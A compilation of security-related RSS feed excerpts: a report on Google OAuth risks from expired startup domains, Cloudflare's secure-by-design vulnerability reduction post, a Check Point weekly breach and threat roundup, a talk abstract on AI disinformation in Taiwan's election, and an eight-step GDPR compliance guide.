Relatedly, lots of business-minded webapps use Google's OAuth, i.e. "Sign in with Google." It's a low-friction feedback loop—up until the startup fails, the domain goes up for sale, and somebody forgot to close down all the Google stuff.&lt;/p&gt;
&lt;p&gt;Dylan Ayrey, of Truffle Security Co., &lt;a href="https://trufflesecurity.com/blog/millions-at-risk-due-to-google-s-oauth-flaw"&gt;suggests in a report&lt;/a&gt; that this problem is more serious than anyone, especially Google, is acknowledging. Many startups make the critical mistake of not properly closing their accounts—on both Google and other web-based apps—before letting their domains expire.&lt;/p&gt;
&lt;p&gt;Given the number of people working for tech startups (6 million), the failure rate of said startups (90 percent), their usage of Google Workspaces (50 percent, all by Ayrey's numbers), and the speed at which startups tend to fall apart, there are a lot of Google-auth-connected domains up for sale at any time. That would not be an inherent problem, except that, as Ayrey shows, buying a domain with a still-active Google account can let you re-activate the Google accounts for former employees.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/startup-necromancy-dead-google-apps-domains-can-be-compromised-by-new-owners/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

In line with this, we're reducing the prevalence of vulnerability classes across our products.</description><content:encoded>&lt;p&gt;In today’s rapidly evolving digital landscape, securing software systems has never been more critical. Cyber threats continue to exploit systemic vulnerabilities in widely used technologies, leading to widespread damage and disruption. That said, the &lt;a href="https://www.cisa.gov/"&gt;&lt;u&gt;United States Cybersecurity and Infrastructure Agency (CISA)&lt;/u&gt;&lt;/a&gt; helped shape best practices for the technology industry with their &lt;a href="https://www.cisa.gov/securebydesign/pledge"&gt;&lt;u&gt;Secure-by-Design pledge&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://blog.cloudflare.com/secure-by-design-principles/"&gt;&lt;u&gt;Cloudflare signed this pledge&lt;/u&gt;&lt;/a&gt; on May 8, 2024, reinforcing our commitment to creating resilient systems where security is not just a feature, but a foundational principle.&lt;/p&gt;&lt;p&gt;We’re excited to share an update aligned with one of CISA’s goals in the pledge: &lt;i&gt;To reduce entire classes of vulnerabilities&lt;/i&gt;. This goal aligns with the Cloudflare Product Security program’s initiatives to continuously automate proactive detection and vigorously prevent vulnerabilities at scale.   &lt;/p&gt;&lt;p&gt;Cloudflare’s commitment to the CISA pledge reflects our dedication to transparency and accountability to our customers. This blog post outlines why we prioritized certain vulnerability classes, the steps we took to further eliminate vulnerabilities, and the measurable outcomes of our work.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The core philosophy that continues: prevent, not patch&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-core-philosophy-that-continues-prevent-not-patch"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare’s core security philosophy is to prevent security vulnerabilities from entering production environments. One of the goals for Cloudflare’s Product Security team is to champion this philosophy and ensure secure-by-design approaches are part of product and platform development. Over the last six months, the Product Security team aggressively added both new and customized rulesets aimed at completely eliminating secrets and injection code vulnerabilities. These efforts have enhanced detection precision, reducing false positives, while enabling the proactive detection and blocking of these two vulnerability classes. Cloudflare’s security practice to block vulnerabilities before they are introduced into code at merge or code changes serves to maintain a high security posture and aligns with CISA’s pledge around proactive security measures.&lt;/p&gt;&lt;p&gt;Injection vulnerabilities are a critical vulnerability class, irrespective of the product or platform. These occur when code and data are improperly mixed due to lack of clear boundaries as a result of inadequate validation, unsafe functions, and/or improper sanitization. Injection vulnerabilities are considered high impact as they lead to compromise of confidentiality, integrity, and availability of the systems involved. Some of the ways Cloudflare continuously detects and prevents these risks is through security reviews, secure code scanning, and vulnerability testing. Additionally, ongoing efforts to institute improved precision serve to reduce false positives and aggressively detect and block these vulnerabilities at the source if engineers accidentally introduce these into code.&lt;/p&gt;&lt;p&gt;Secrets in code is another vulnerability class of high impact, as it presents significant risk related to confidential information leaks, potentially leading to unauthorized access and insider threat challenges. In 2023, Cloudflare prioritized tuning our security tools and systems to further improve the detection and reduction of secrets within code. Through audits and usage patterns analysis across all Cloudflare repositories, we further decreased the probability of the reintroduction of these vulnerabilities into new code by writing and enabling enhanced secrets detection rules.&lt;/p&gt;&lt;p&gt;Cloudflare is committed to elimination of these vulnerability classes regardless of their criticality. By addressing these vulnerabilities at their source, Cloudflare has significantly reduced the attack surface and the potential for exploitation in production environments. This approach established secure defaults by enabling developers to rely on frameworks and tools that inherently separate data or secrets from code, minimizing the need for reactive fixes. Additionally, resolving these vulnerabilities at the code level “future-proofs” applications, ensuring they remain resilient as the threat landscape evolves. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cloudflare’s techniques for addressing these vulnerabilities&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflares-techniques-for-addressing-these-vulnerabilities"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;To address both injection and embedded secrets vulnerabilities, Cloudflare focused on building secure defaults, leveraging automation, and empowering developers. To establish secure default configurations, Cloudflare uses frameworks designed to inherently separate data from code. We also increased reliance on secure storage systems and secret management tools, integrating them seamlessly into the development pipeline.&lt;/p&gt;&lt;p&gt;&lt;i&gt;Continuous automation played a critical role in our strategy.&lt;/i&gt; Static analysis tools integration with DevOps process were enhanced with customized rule sets to block issues based on observed patterns and trends. Additionally, along with security scans running on every pull and merge request, software quality assurance measures of “build break”  and “stop the code” were enforced. This prevented risks from entering production when true positive vulnerabilities were detected across all Cloudflare development activities, irrespective of criticality and impacted product. This proactive approach has further reduced the likelihood of these vulnerabilities reaching production environments. &lt;/p&gt;&lt;p&gt;&lt;i&gt;Developer enablement was another key pillar&lt;/i&gt;. Priority was placed on bolstering existing continuous education and training for engineering teams by providing additional guidance and best practices on preventing security vulnerabilities, and leveraging our centralized secrets platform in an automated way. Embedding these principles into daily workflows has fostered a culture of shared responsibility for security across the organization.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The role of custom rulesets and “build break” &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-role-of-custom-rulesets-and-build-break"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;To operationalize the more aggressive detection and blocking capabilities, Cloudflare’s Product Security team wrote new detection rulesets for its &lt;a href="https://en.wikipedia.org/wiki/Static_application_security_testing"&gt;&lt;u&gt;static application security testing (SAST)&lt;/u&gt;&lt;/a&gt; tool integrated in CI/CD workflows and hardened the security criteria for code releases to production. Using the SAST tooling with both default and custom rulesets allows the security team to perform comprehensive scans for secure code, secrets, and software supply chain vulnerabilities, virtually eliminating injection vulnerabilities and secrets from source code. It also enables the security team to identify and address issues early while systematically enforcing security policies.&lt;/p&gt;&lt;p&gt;Cloudflare’s expansion of the security tool suite played a critical role in the company’s secure product strategy. Initially, rules were enabled in “monitoring only” mode to understand trends and potential false positives. Then rules were fine-tuned to enforce and adjust priorities without disrupting development workflows. Leveraging internal threat models, the team writes custom rules tailored to Cloudflare’s infrastructure. Every &lt;a href="https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests"&gt;&lt;u&gt;pull request (PR)&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://github.com/diffblue/gitlab/blob/master/doc/user/project/merge_requests/creating_merge_requests.md"&gt;&lt;u&gt;merge request (MR)&lt;/u&gt;&lt;/a&gt; was scanned against these specific rule sets, including those targeting injection and secrets. The fine-tuned rules, optimized for high precision, are then activated in blocking mode, which leads to breaking the build when detected. This process provides vulnerability remediation at the PR/MR stage.&lt;/p&gt;&lt;p&gt;Hardening these security checks directly into the CI/CD pipeline enforces a proactive security assurance strategy in the development lifecycle. This approach ensures vulnerabilities are detected and addressed early in the development process before reaching production. The detection and blocking of these issues early reduces remediation efforts, minimizes risk, and strengthens the overall security of our products and systems.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Outcomes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#outcomes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare continues to follow a culture of transparency as it provides increased visibility into the root cause of an issue and consequently allowing us to improve the process/product at scale. As a result, these efforts have yielded tangible results and continue to strengthen the security posture of all Cloudflare products.&lt;/p&gt;&lt;p&gt;In the second half of 2024, the team aggressively added new rulesets that helped detect and remove new secrets introduced into code repositories. This led to a 79% reduction of secrets in code over the previous quarter, underscoring Cloudflare’s commitment to safeguarding the company's codebase and protecting sensitive information. Following a similar approach, the team also introduced new rulesets in blocking mode, irrespective of the criticality level for all injection vulnerabilities. These improvements led to an additional 44% reduction of potential SQL injection and code injection vulnerabilities.&lt;/p&gt;&lt;p&gt;While security tools may produce false positives, customized rulesets with high-confidence true positives remain a key step in order to methodically evaluate and address the findings. These reductions reflect the effectiveness of proactive security measures in reducing entire vulnerability classes at scale. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Future plans&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#future-plans"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Cloudflare will continue to mature the current practices and enforce secure-by-design principles. Some other security practices we will continue to mature include: providing secure frameworks, threat modeling at scale, integration of automated security tooling in every stage of the software development lifecycle (SDLC), and ongoing role based developer training on leading edge security standards. All of these strategies help reduce, or eliminate, entire classes of vulnerabilities.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Conclusion&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#conclusion"&gt;
              
            &lt;/a&gt;

&lt;br /&gt;&lt;br /&gt;
&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;The International Civil Aviation Organization (ICAO), that is part of the UN, &lt;a href="https://therecord.media/icao-un-confirms-recruitment-systems-data-breach"&gt;confirmed&lt;/a&gt; a compromise of its recruitment database that exposed 42,000 recruitment applications. The data contains records from April 2016 to July 2024 and includes recruitment-related information, such as names, email addresses, dates of birth, and employment history.&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
 	&lt;li&gt;Argentina’s airport security police (PSA) has been &lt;a href="https://securityaffairs.com/172776/uncategorized/argentinas-airport-security-police-psa-payroll-hacked.html"&gt;compromised&lt;/a&gt; with threat actors gaining access to its payroll systems. The attack occurred through a vulnerability in the systems of Banco Nación, which processes PSA’s payroll. The threat actors obtained personal and financial data of the agency’s officers and civilian personnel.&lt;/li&gt;
 	&lt;li&gt;Slovakia’s Office of Geodesy, Cartography and Land Registry (UGKK) has been &lt;a href="https://spectator.sme.sk/politics-and-society/c/news-digest-quite-possibly-the-worst-cyber-attack-in-history-of-slovakia"&gt;compromised&lt;/a&gt;, affecting availability of the land ownership database. Media outlets report that UGKK fell victim to an undisclosed ransomware group.&lt;/li&gt;
 	&lt;li&gt;Spanish telecommunications company Telefónica was &lt;a href="https://www.bleepingcomputer.com/news/security/telefonica-confirms-internal-ticketing-system-breach-after-data-leak/"&gt;targeted&lt;/a&gt; by Hellcat Ransomware. The threat actors accessed Telefónica’s ticketing system and extracted 2,3 GB of documents, tickets data and internal files. The database was leaked on a hacking forum.&lt;/li&gt;
 	&lt;li&gt;Everest ransomware group has &lt;a href="https://www.stiiizy.com/pages/notice-of-data-breach"&gt;breached&lt;/a&gt; a popular cannabis vendor named STIIIZY through a 3&lt;sup&gt;rd&lt;/sup&gt; party point-of-sale processing service. The compromise occurred between October 10, 2024, and November 10, 2024, and led to extraction of personal data and IDs of 422,075 customers.&lt;/li&gt;
 	&lt;li&gt;BayMark Health Services were &lt;a href="https://ago.vermont.gov/sites/ago/files/documents/2025-01-08%20BayMark%20Health%20Services%20Data%20Breach%20Notice%20to%20Consumers.pdf"&gt;compromised&lt;/a&gt; by RansomHub ransomware group, which also exfiltrated 1.5 TB of its data. The attack occurred between September 24, 2024, and October 14, 2024, providing the attackers access to personal identifiable information, such as Social Security numbers, dates of birth, insurance information and other details.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint provides protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Win.RansomHub; Ransomware.Wins.RansomHub.ta.*) &lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
 	&lt;li&gt;Russian internet services provider (ISP) named Nodex was &lt;a href="https://therecord.media/russian-internet-provider-says-network-destroyed-cyberattack"&gt;shut down&lt;/a&gt; by a Ukrainian hacktivist group Ukrainian Cyber Alliance. The attack has destroyed the company’s network, dropping global traffic from Nodex’s autonomous system AS29329 to zero.&lt;/li&gt;
 	&lt;li&gt;The Green Bay Packers&amp;#8217; official online store &lt;a href="https://www.greenbaypressgazette.com/story/sports/nfl/packers/2025/01/07/packers-pro-shop-experienced-data-breach-in-fall-2024-green-bay/77514322007/"&gt;suffered&lt;/a&gt; a security breach that resulted in the theft of payment card information from over 8,500 customers. Attackers injected malicious code into the checkout page between September and October 2024, capturing personal and payment details. Payments made via gift cards, PayPal, or Amazon Pay were not affected.&lt;/li&gt;
&lt;/ul&gt;
&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;Mozilla has &lt;a href="https://www.mozilla.org/en-US/security/advisories/mfsa2025-01/"&gt;released&lt;/a&gt; version 134 of its Firefox browser, addressing 11 security vulnerabilities. Three of the patched vulnerabilities, CVE-2025-0242, CVE-2025-0244 and CVE-2025-0247 are considered of high severity as they allowed memory corruption or address bar spoofing.&lt;/li&gt;
 	&lt;li&gt;SonicWall has &lt;a href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003"&gt;published&lt;/a&gt; an advisory addressing high severity authentication bypass vulnerability CVE-2024-53704 alongside three other medium security vulnerabilities. The company has been sending out emails urging customers to update the firmware due to high susceptibility of exploitation of the vulnerability.&lt;/li&gt;
 	&lt;li&gt;Mediatek has &lt;a href="https://corp.mediatek.com/product-security-bulletin/January-2025"&gt;issued&lt;/a&gt; an advisory addressing 13 security vulnerabilities affecting the company&amp;#8217;s products. Among the vulnerabilities is the critical vulnerability CVE-2024-20154, which allows exploiting an out-of-bounds write to gain remote code execution.&lt;/li&gt;
&lt;/ul&gt;
&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;
&lt;ul&gt;
 	&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;uncovered&lt;/a&gt; Banshee, a macOS infostealer that mimics Apple&amp;#8217;s XProtect antivirus engine to evade detection. Operating as a Stealer-as-a-Service, Banshee has been distributed via phishing websites and malicious GitHub repositories, targeting macOS users to steal browser credentials, cryptocurrency wallets, and sensitive file data. Despite the operation&amp;#8217;s shutdown following a source code leak, threat actors continue to distribute the infostealer.&lt;/li&gt;
 	&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/funksec-alleged-top-ransomware-group-powered-by-ai/"&gt;analyzed&lt;/a&gt; the FunkSec ransomware group, which emerged in late 2024 and claimed over 85 victims in December, surpassing other ransomware groups during that period. FunkSec appears to utilize AI-assisted malware development, enabling even inexperienced actors to produce and refine advanced tools rapidly. The group&amp;#8217;s activities blur the line between hacktivism and cybercrime, with some leaked datasets recycled from previous hacktivist campaigns, raising doubts about the authenticity of their disclosures.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony Endpoint provides protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Wins.Funksec.A) &lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
 	&lt;li&gt;Check Point has &lt;a href="https://blog.checkpoint.com/security/brand-impersonation-scam-hijacks-travel-agency-accounts/"&gt;identified&lt;/a&gt; a phishing campaign that has targeted 7,300 businesses and 40,000 individuals around the world, with the majority of targets in the US. The campaign uses compromised accounts of a travel agency Riya, delivering malware, and harvesting credentials.&lt;/li&gt;
 	&lt;li&gt;Researchers have &lt;a href="https://therecord.media/china-espionage-ivanti-vulnerabilities-mandiant"&gt;identified&lt;/a&gt; that China-affiliated espionage groups are exploiting a newly disclosed vulnerability, CVE-2025-0282, in Ivanti&amp;#8217;s Connect Secure VPN appliances. Mandiant observed initial exploitation in mid-December by malware families such as SPAWN, previously associated with Chinese threat actors like UNC5221. The US Cybersecurity and Infrastructure Security Agency (CISA) has mandated federal agencies to patch this vulnerability by January 15, 2025, due to its active exploitation.&lt;/li&gt;
&lt;/ul&gt;

But looking at Taiwan’s 2024 election, none of these nightmare scenarios materialized. The deafening silence of effective AI disinformation from China, America’s most advanced opponent, was surprising. Even more so given the focus on the election at the highest levels of the Chinese government.&lt;/p&gt;
&lt;p&gt;In this highly-engaging talk, Martin Wendiggensen details how he set out to study the election and collected tens of thousands of hours of footage from YouTube and television as well as hundreds of thousands of news articles, blog posts, and social media content. This collection was then analyzed with a multi-modal AI pipeline. The results indicated that the small amount of AI-content received no engagement and had no impact.&lt;/p&gt;
&lt;p&gt;Instead, Taiwanese billionaires earning most of their money in China mounted a concerted effort to buy or set up local news outlets in Taiwan in the run-up to the election. Conducting a large-scale analysis of these outlets’ output uncovered interesting results. Their viewership, numbering in the millions, presented slanted narratives aligned with the Beijing-friendly KMT and a new emergent third party. While losing the presidential election, these two parties managed to wrest control of Taiwan’s parliament and are set to have a major impact on the country’s foreign and domestic policies.&lt;/p&gt;
&lt;p&gt;This presentation guides the audience through Chinese and local disinformation efforts in the Taiwanese election, highlighting the main lessons that can be drawn from them to safeguard future elections. Along the way, Martin explains the research methodology and toolbox that leverages open-source AI to fight disinformation.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;

&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Secure-management-buy-in"&gt;Secure management buy-in&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Identify-what-personal-data-you-hold"&gt;Identify what personal data you hold&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Identify-your-processing-activities"&gt;Identify your processing activities&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Identify-your-purposes-for-processing"&gt;Identify your purposes for processing&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Eliminate-inefficiencies"&gt;Eliminate inefficiencies&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Conduct-a-risk-assessment"&gt;Conduct a risk assessment&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Conduct-a-DPIA-(data-protection-impact-assessment)"&gt;Conduct a DPIA (data protection impact assessment)&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Implement-appropriate-technical-and-organisational-measures"&gt;Implement appropriate technical and organisational measures&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Secure-management-buy-in"&gt;1. Secure management buy-in&lt;/h2&gt;



&lt;p&gt;Board or senior management support is a prerequisite to successfully introducing cultural change to the organisation.&lt;/p&gt;



&lt;p&gt;This doesn’t just ensure the project will be sufficiently resourced, but also ensures improved cooperation. Don’t forget: while someone will be in charge of the overall project – the data protection lead – that person isn’t responsible for ‘doing’ compliance themselves. Rather, they guide others through the necessary activities, and are responsible for maintaining compliance.&lt;/p&gt;



&lt;p&gt;But to get such cooperation, and see as little resistance to change as possible, managers must support these changes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-what-personal-data-you-hold"&gt;2. Identify what personal data you hold&lt;/h2&gt;



&lt;p&gt;Contrary to common belief, the GDPR &lt;em&gt;isn’t&lt;/em&gt; prescriptive.&lt;/p&gt;



&lt;p&gt;The Regulation doesn’t list specific actions every organisation within scope must take. Rather, it takes a principles- and risk-based approach. Organisations that process less personal data, or less &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;sensitive data&lt;/a&gt;, require less rigorous measures than entities that process lots of highly sensitive data.&lt;/p&gt;



&lt;p&gt;But to determine what’s appropriate for your organisation, you must first identify exactly what personal data you’re collecting and holding.&lt;/p&gt;



&lt;p&gt;To make life easier, take it one department at a time, preferably starting with HR and other highly regulated teams. Data protection leads may also want to look at higher-risk departments before lower-risk teams, as well as take into account which teams are more receptive to becoming compliant.&lt;/p&gt;



&lt;p&gt;You may well find that as you get a few teams on board, and they start to experience the day-to-day benefits of compliance, the remaining teams become more cooperative too.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-your-processing-activities"&gt;3. Identify your processing activities&lt;/h2&gt;



&lt;p&gt;Once you’ve identified what personal data you collect and process, you can identify the processing activities for which you’re using that data.&lt;/p&gt;



&lt;p&gt;You could think of this as creating your ‘data inventory’, which you can later use as the basis for your Article 30 &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt;. Make sure you specifically identify what data is used for what processing activities. This will highlight data you might be collecting but not using, or that doesn’t need to be used to fulfil the purpose of a given activity (raising &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;issues around lawfulness&lt;/a&gt;).&lt;/p&gt;



&lt;p&gt;This isn’t just to meet key GDPR principles like data minimisation and purpose limitation, but also minimises the risk to your organisation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-your-purposes-for-processing"&gt;4. Identify your purposes for processing&lt;/h2&gt;



&lt;p&gt;The GDPR demands that personal data be processed &lt;em&gt;lawfully&lt;/em&gt;.&lt;/p&gt;



&lt;p&gt;That means you must be able to rely on one of six &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful bases&lt;/a&gt; to process the data:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Contractual obligation&lt;/li&gt;



&lt;li&gt;Legal obligation&lt;/li&gt;



&lt;li&gt;Vital interests&lt;/li&gt;



&lt;li&gt;Public interest&lt;/li&gt;



&lt;li&gt;Legitimate interests&lt;/li&gt;



&lt;li&gt;Consent&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;If you can’t point to one of these purposes for a processing activity, that doesn’t simply make the processing unlawful – it strongly suggests the data isn’t serving a &lt;em&gt;business &lt;/em&gt;purpose, either.&lt;/p&gt;



&lt;p&gt;If you can’t explain why you’re collecting the data – and “just in case” isn’t a good reason – you should probably destroy that data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;h2 class="wp-block-heading" id="Eliminate-inefficiencies"&gt;5. Eliminate inefficiencies&lt;/h2&gt;



&lt;p&gt;Besides uncovering data you don’t need, you may identify other inefficiencies, too:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Duplicated work/processes&lt;/li&gt;



&lt;li&gt;A process that could be done in another way (simpler, cheaper, faster, etc.)&lt;/li&gt;



&lt;li&gt;Data that’s not properly secured&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Addressing such matters makes it easier to manage your risks, and improves data governance and accountability. People will take ownership and responsibility for their roles, and communicate better.&lt;/p&gt;



&lt;p&gt;As an organisation, you’ll also be more confident and create a better culture.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Conduct-a-risk-assessment"&gt;6. Conduct a risk assessment&lt;/h2&gt;



&lt;p&gt;Now that your business processes are more settled, it’s time to look at your risks.&lt;/p&gt;



&lt;p&gt;In spite of the general rewards that come from achieving GDPR compliance, most organisations pursue it – in the first instance – to mitigate their risks. Specifically, those of data breaches and enforcement action.&lt;/p&gt;



&lt;p&gt;We’ve previously interviewed our head of GRC consultancy, Damian Garcia, about &lt;a href="https://www.itgovernance.co.uk/blog/how-to-manage-your-cyber-risks" rel="noreferrer noopener" target="_blank"&gt;where to start with risk management&lt;/a&gt;, &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;how to mitigate risks&lt;/a&gt;, and &lt;a href="https://www.itgovernance.co.uk/blog/how-to-select-effective-security-controls" rel="noreferrer noopener" target="_blank"&gt;how to select effective security controls&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Some of his top tips include:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Make sure you clearly define what constitutes a ‘high’, ‘medium’ or ‘low’ risk. Establish a common vocabulary to make sure everyone is using the same words to mean the same thing.&lt;/li&gt;



&lt;li&gt;Remember that you don’t have to &lt;em&gt;eliminate&lt;/em&gt; a risk – just bring the risk level down to an acceptable level.&lt;/li&gt;



&lt;li&gt;To achieve this, you can choose from four broad risk responses: modify, share, retain and avoid.&lt;/li&gt;



&lt;li&gt;Of these, ‘modify’ – i.e. implementing a control – is the most common response. When choosing your measures, be sure to ask ‘why’. What &lt;em&gt;benefit&lt;/em&gt; does that control have, and does it outweigh its cost?&lt;/li&gt;



&lt;li&gt;Should you choose to ‘share’ a risk, remember that outsourcing a risk doesn’t equate to getting rid of that risk. Damian gave more specific tips on mitigating the risks around outsourcing &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk#Share-the-risk" rel="noreferrer noopener" target="_blank"&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;







&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Conduct-a-DPIA-(data-protection-impact-assessment)"&gt;7. Conduct a DPIA&lt;/h2&gt;



&lt;p&gt;Where processing “is likely to result in a high risk to the rights and freedoms of natural persons”, organisations must carry out a DPIA (data protection impact assessment) under Article 35 of the GDPR.&lt;/p&gt;



&lt;p&gt;To identify processing activities that may present that “high risk”, look to your data inventory and/or data flow maps. They’ll likely involve special categories of data (such as medical information), &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;international transfers&lt;/a&gt;, new software, new processing activities, and so on. Our &lt;a href="https://www.itgovernance.co.uk/a-concise-guide-to-data-protection-impact-assessments" rel="noreferrer noopener" target="_blank"&gt;free green paper&lt;/a&gt; elaborates on which processing activities are likely to require a DPIA, and how to conduct one.&lt;/p&gt;



&lt;p&gt;Remember that the risk must be “high” from the &lt;em&gt;data subject’s&lt;/em&gt; perspective – not that of the organisation, as with typical risk assessments.&lt;/p&gt;



&lt;p&gt;That said, by mitigating the risks to the data subject, you’ll likely also be reducing the risks to your organisation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Implement-appropriate-technical-and-organisational-measures"&gt;8. Implement appropriate technical and organisational measures&lt;/h2&gt;



&lt;p&gt;Another key GDPR principle is ‘integrity and confidentiality.’&lt;/p&gt;



&lt;p&gt;This requires personal data to be processed in a way that ensures “appropriate security” by using “appropriate technical or organisational measures”. In addition, Article 32 of the GDPR requires appropriate technical and organisational measures to ensure “a level of security appropriate to the risk”.&lt;/p&gt;



&lt;p&gt;Such measures can include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Encryption&lt;/li&gt;



&lt;li&gt;Pseudonymisation&lt;/li&gt;



&lt;li&gt;Strong &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-staff-awareness" rel="noreferrer noopener" target="_blank"&gt;Staff awareness training&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Up-to-date, effective &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-documentation-toolkit" rel="noreferrer noopener" target="_blank"&gt;policies and procedures&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Take the next step in your GDPR compliance project&lt;/h2&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="alignright size-large is-resized" id="cc-logo"&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel=" noreferrer noopener" target="_blank"&gt;&lt;img alt="" src="https://www.itgovernance.co.uk/shop/images/product/medium/5370.png" style="width: 200px;" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These eight steps should get your GDPR project off to a good start, laying the groundwork for both compliance and more efficient business processes.&lt;/p&gt;



